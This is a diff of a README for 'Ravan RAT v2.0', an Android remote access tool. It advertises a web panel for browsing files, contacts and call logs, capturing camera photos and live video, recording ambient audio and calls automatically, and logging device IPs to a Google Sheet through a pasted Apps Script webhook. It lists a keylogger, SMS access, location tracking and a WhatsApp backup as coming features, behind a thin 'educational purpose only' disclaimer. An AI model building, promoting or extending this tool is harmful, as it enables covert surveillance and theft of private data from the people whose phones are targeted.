@@ -1,71 +1,175 @@
-# 🔥 Ravan RAT
+# 🔥 Ravan RAT v2.0
 
-A simple Android app that runs a remote server on your phone accessible via IPv6.
+![Ravan Logo](ravanrat.png)
 
-## 🚀 How to Use
-
-1. **Install** the APK on your Android phone.
-2. **Open** the app and grant all permissions (Storage, Contacts, Camera, etc.).
-3. Tap **Start Server**.
-4. You will see a URL like `http://[2405:201:...]:8080`.
-5. Enter that URL in a browser on any other device to access files, contacts, call logs, and camera.
+**Remote Android Administration Tool with Web Panel**
 
 ---
 
-## 📊 Automatic IP Reporting (Google Sheets)
+## � Updates Every Sunday!
 
-Since IPv6 addresses change often, you can set up a Google Sheet to automatically receive your phone's latest public IP address.
+New features drop every week. Star ⭐ this repo to stay updated!
 
-### Step 1: Set up Google Sheet
-
-1. Create a new [Google Sheet](https://sheets.google.com).
-2. Write these headers in the first row:
-   `Timestamp` | `IP Address` | `Port` | `Device`
-
-### Step 2: Add the Script
-
-1. In your Google Sheet, click **Extensions** > **Apps Script**.
-2. Delete everything and paste this code:
-   ```javascript
-   function doPost(e) {
-     var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-     var data = JSON.parse(e.postData.contents);
-     sheet.appendRow([new Date(), data.ip, data.port, data.device]);
-     return ContentService.createTextOutput(
-       JSON.stringify({ status: "success" }),
-     );
-   }
-   ```
-3. Click **Deploy** (blue button) > **New Deployment**.
-4. Click the gear icon ⚙️ > **Web App**.
-5. Set **Who has access** to **Anyone** (Important!).
-6. Click **Deploy** and **Copy** the Web App URL.
-
-### Step 3: Connect to App
-
-1. Open the project folder on your computer.
-2. Create or open the file named `local.properties`.
-3. Add your URL inside it like this:
-   ```properties
-   WEBHOOK_URL=https://script.google.com/macros/s/YOUR-LONG-URL-HERE/exec
-   ```
-4. Build and install the app. Now, whenever your internet changes, the new IP will appear in your Google Sheet!
+**Got ideas?** Open an issue or DM me. Contributions welcome!
 
 ---
 
-## 🛠️ Build from Source
+## 🚀 Quick Build
 
-1.  Ensure you have JDK 11+ and Android SDK installed.
-2.  Clone the repo.
-3.  Create `local.properties` with your `sdk.dir` and optionally `WEBHOOK_URL`.
-4.  Run:
-    ```bash
-    ./gradlew clean assembleRelease
-    ```
-5.  Find your APK in `app/build/outputs/apk/release/`.
+### Windows
+
+```
+cd builder
+.\build.ps1
+```
+
+### Linux / Mac
+
+```
+cd builder
+chmod +x build.sh
+./build.sh
+```
+
+That's it! The builder handles everything - Java check, keystore, logo, and APK.
+
+---
+
+## ✨ What's Inside
+
+**Device Access**
+
+- 📁 File Manager - Browse & download files
+- � Call Logs - View call history
+- 👥 Contacts - Access saved contacts
+- 📱 Device Info - System details
+
+**Camera**
+
+- 📸 Photo Capture - Front/back camera
+- 🎥 Live Stream - Real-time view
+- ⏺️ Video Recording
+
+**Audio** _(New in v2.0)_
+
+- 🎤 Mic Recording - Ambient audio
+- 📞 Call Recording - Auto record calls
+- ⚙️ Settings - Toggle auto-record
+
+**Web Panel**
+
+- 🌐 Access from any browser
+- 📱 Works on phone/PC
+- 🔄 Real-time updates
+
+---
+
+## 📋 How It Works
+
+1. Build APK using builder scripts
+2. Install on Android device
+3. Grant permissions
+4. Start server
+5. Open the IPv6 URL in browser
+6. Control device remotely
+
+---
+
+## �️ Builder Features
+
+- ✅ Auto Java check/install
+- ✅ Keystore generation
+- ✅ Custom app name
+- ✅ Custom logo (uses ravanrat.png)
+- ✅ Version config
+- ✅ Google Sheet webhook
+- ✅ One-click build
+
+---
+
+## 📊 Google Sheet Setup
+
+Want device IPs in a spreadsheet?
+
+1. Create Google Sheet
+2. Extensions → Apps Script
+3. Paste this:
+
+```javascript
+function doPost(e) {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var data = JSON.parse(e.postData.contents);
+  sheet.appendRow([new Date(), data.device, data.ip, data.port]);
+  return ContentService.createTextOutput("OK");
+}
+```
+
+4. Deploy → Web App → Anyone
+5. Copy URL → Paste in builder
+
+---
+
+## � Folder Structure
+
+```
+ravan-v2/
+├── ravanrat.png          # Logo
+├── builder/
+│   ├── build.sh          # Linux/Mac
+│   ├── build.bat         # Windows CMD
+│   ├── build.ps1         # Windows PowerShell
+│   └── output/           # Built APKs
+└── app/                  # Android source
+```
+
+---
+
+## 🔜 Coming Soon
+
+- [ ] SMS Access
+- [ ] Location Tracking
+- [ ] Notification Reader
+- [ ] Keylogger
+- [ ] Screen Capture
+- [ ] App List
+- [ ] WhatsApp Backup
+- [ ] Gallery Access
+
+_Check back every Sunday for updates!_
+
+---
+
+## 🤝 Contribute
+
+Found a bug? Have an idea?
+
+- Open an issue
+- Submit a PR
+- DM me on LinkedIn
+
+All contributions welcome!
+
+---
+
+## �‍💻 Developer
+
+**Somesh Srichandan**
+
+[![GitHub](https://img.shields.io/badge/GitHub-someshsrichandan-black?logo=github)](https://github.com/someshsrichandan)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-someshsrichandan-blue?logo=linkedin)](https://linkedin.com/in/someshsrichandan)
 
 ---
 
 ## ⚠️ Disclaimer
 
-This tool is for **Educational Purpose Only**.
+Educational purpose only. Don't use without permission. I'm not responsible for misuse.
+
+---
+
+## � License
+
+MIT License
+
+---
+
+**⭐ Star this repo for weekly updates!**
